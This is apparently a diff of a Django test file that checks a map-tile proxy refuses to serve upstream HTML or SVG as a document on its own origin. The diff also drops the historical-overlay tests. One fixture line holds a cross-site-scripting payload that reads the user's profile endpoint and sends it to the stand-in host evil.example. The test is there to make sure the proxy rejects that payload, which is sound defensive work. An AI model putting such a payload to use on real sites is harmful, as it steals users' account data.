@@ -1,16 +1,16 @@
 """
 A tile proxy serves whatever the upstream sent, under this deployment's own origin.
 
-Both proxies pass the upstream ``Content-Type`` straight to the browser, and the basemap one is
+The proxy passes the upstream ``Content-Type`` straight to the browser, and is
 ``csp_exempt`` - a Content-Security-Policy governs what a document may load, so on a tile it is
 1.2kB of header that can never apply, except that a response served as ``text/html`` *is* a
 document. An upstream that answers a tile request with markup therefore gets that markup rendered
 on this origin, kept for the week the tile cache-control asks for, from a URL that looks like a
 PNG. ``image/svg+xml`` is the same attack in a type the word "image" covers.
 
-REData is a sibling service rather than a stranger, which is the reason this is defence in depth
+The catalogue service may be a sibling rather than a stranger, which is the reason this is defence in depth
 and not an open door - and also the reason it is worth having: the proxy is the only thing between
-whatever REData's own upstreams return and a script tag on this origin.
+whatever its own upstreams return and a script tag on this origin.
 """
 
 from __future__ import annotations
@@ -23,13 +23,9 @@ from django.urls import reverse
 from model_bakery import baker
 
 from urbanlens.core.tests.testcase import TestCase
-from urbanlens.dashboard.tests.hypothesis.redata_helpers import RedataConfiguredMixin
+from urbanlens.dashboard.tests.hypothesis.tile_catalogue_fake import FakeCatalogueMixin, catalogue_on
 
-_BASEMAP_GATEWAY = "urbanlens.dashboard.services.apis.locations.redata_basemap_tiles_gateway.RedataBasemapTilesGateway"
-_HISTORICAL_GATEWAY = (
-    "urbanlens.dashboard.services.apis.locations.redata_historical_maps_gateway.RedataHistoricalMapsGateway"
-)
-_CONFIGURED = "urbanlens.dashboard.services.apis.locations.redata_context_gateway.redata_configured"
+_BASEMAP_GATEWAY = "urbanlens.dashboard.tests.hypothesis.tile_catalogue_fake.FakeTileCatalogue"
 
 _SCRIPT = b"<script>fetch('/dashboard/rest/profiles/me/').then(r => r.text()).then(t => fetch('//evil.example/?' + t))</script>"
 
@@ -45,7 +41,7 @@ _HOSTILE_TYPES = (
 )
 
 
-class _TileCase(RedataConfiguredMixin, TestCase):
+class _TileCase(FakeCatalogueMixin, TestCase):
     def setUp(self) -> None:
         super().setUp()
         cache.clear()
@@ -61,7 +57,7 @@ class ABasemapTileIsNeverADocumentTests(_TileCase):
 
     def _serve(self, body: bytes, content_type: str, times: int = 1):
         with (
-            mock.patch(_CONFIGURED, return_value=True),
+            catalogue_on(),
             mock.patch(f"{_BASEMAP_GATEWAY}.download_tile", return_value=(200, body, content_type)) as download,
         ):
             responses = [self.client.get(self.url) for _ in range(times)]
@@ -125,62 +121,3 @@ class ABasemapTileIsNeverADocumentTests(_TileCase):
         responses, _download = self._serve(b"\x89PNG\r\n\x1a\n", "image/png")
 
         self.assertEqual(responses[0]["X-Content-Type-Options"], "nosniff")
-
-
-class AHistoricalOverlayTileIsNeverADocumentTests(_TileCase):
-    """The same proxy shape, one route over, which got none of the basemap proxy's hardening."""
-
-    def setUp(self) -> None:
-        super().setUp()
-        self.url = reverse(
-            "map.historical_tiles",
-            kwargs={"georeference_uuid": "00000000-0000-4000-8000-000000000000", "z": 12, "x": 1204, "y": 1539},
-        )
-
-    def _serve(self, body: bytes, content_type: str, times: int = 1):
-        with (
-            mock.patch(_CONFIGURED, return_value=True),
-            mock.patch(f"{_HISTORICAL_GATEWAY}.download_tile", return_value=(200, body, content_type)) as download,
-        ):
-            responses = [self.client.get(self.url) for _ in range(times)]
-        return responses, download
-
-    def test_markup_from_the_upstream_is_not_served_as_markup(self) -> None:
-        for content_type in _HOSTILE_TYPES:
-            with self.subTest(content_type=content_type):
-                cache.clear()
-                responses, _download = self._serve(_SCRIPT, content_type)
-
-                self.assertNotEqual(responses[0].status_code, 200, f"{content_type} was served from this origin")
-                self.assertNotIn(b"<script", responses[0].content)
-
-    def test_an_ordinary_tile_is_still_served(self) -> None:
-        responses, _download = self._serve(b"\x89PNG\r\n\x1a\n", "image/png")
-
-        self.assertEqual(responses[0].status_code, 200)
-        self.assertEqual(responses[0]["Content-Type"], "image/png")
-
-    def test_the_browser_is_told_not_to_guess(self) -> None:
-        responses, _download = self._serve(b"\x89PNG\r\n\x1a\n", "image/png")
-
-        self.assertEqual(responses[0]["X-Content-Type-Options"], "nosniff")
-
-
-class AHistoricalTileRefusalIsNotAWarningTests(_TileCase):
-    """A rate-limited or disabled upstream refuses once per tile while the map pans; that is routine, not a fault."""
-
-    def test_a_refused_fetch_answers_503_without_a_warning(self) -> None:
-        from urbanlens.dashboard.services.core.rate_limiter import RateLimitExceededError
-
-        url = reverse(
-            "map.historical_tiles",
-            kwargs={"georeference_uuid": "00000000-0000-4000-8000-000000000000", "z": 12, "x": 1204, "y": 1539},
-        )
-        with (
-            mock.patch(_CONFIGURED, return_value=True),
-            mock.patch(f"{_HISTORICAL_GATEWAY}.download_tile", side_effect=RateLimitExceededError("redata")),
-            self.assertNoLogs("urbanlens.dashboard.controllers.historical_map_tiles", level="WARNING"),
-        ):
-            response = self.client.get(url)
-
-        self.assertEqual(response.status_code, 503)
